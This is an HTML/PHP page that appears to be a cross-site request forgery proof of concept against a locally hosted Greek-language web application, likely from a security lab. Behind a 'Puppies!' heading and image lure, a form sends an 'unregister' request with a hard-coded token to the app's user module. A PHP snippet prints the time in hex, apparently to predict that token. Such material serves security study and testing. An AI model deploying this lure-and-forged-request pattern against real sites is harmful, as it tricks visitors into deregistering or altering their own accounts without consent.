<html>
<head>
    <script type="text/javascript">
        function confirmation (name) {
            if (confirm("Σημείωση: Το αρχείο " + name + " θα διαγραφεί μόνο από τον κατάλογό σας" )) {
                return true;
            } else {
                return false;
            }
            return true;
        }

        function confirmationall (name) {
            if (confirm("Σημείωση: Τα αρχεία θα διαγραφούν μόνο από τον κατάλογό σας" )) {
                return true;
            } else {
                return false;
            }
            return true;
        }

        function confirmsend (){
            if (confirm("Send content files to individual destinations ?")) {
                return true;
            } else {
                return false;
            }
            return true;
        }

        function checkForm (frm) {
            if (frm.elements["recipients[]"].selectedIndex < 0) {
                alert("Παρακαλούμε επιλέξτε το χρήστη στον οποίο θέλετε να σταλεί το αρχείο.");
                return false;
            } else if (frm.file.value == "") {
                alert("Δεν έχετε επιλέξει κάποιο αρχείο για να ανεβάσετε.");
                return false;
            } else {
                return true;
            }
        }
    </script>
</head>
    <body>
        <h1><?= "Puppies!" ?></h1>
        <img src="https://i.ytimg.com/vi/DhpYAyVsFXQ/hqdefault.jpg"></img>
        <form action='http://localhost:8001/modules/user/user.php' method='get'>
            <input type="text" name="unregister" value="11"/>
            <input type="text" name="_token" value="a999fb61eb1e67b48e518699c336b0dc"/>
            <input type="submit"/>
            <br/></form>
    </body>
</html>

<?php
print_r(sprintf('%08x', time())."\n");
//print_r(time());
?>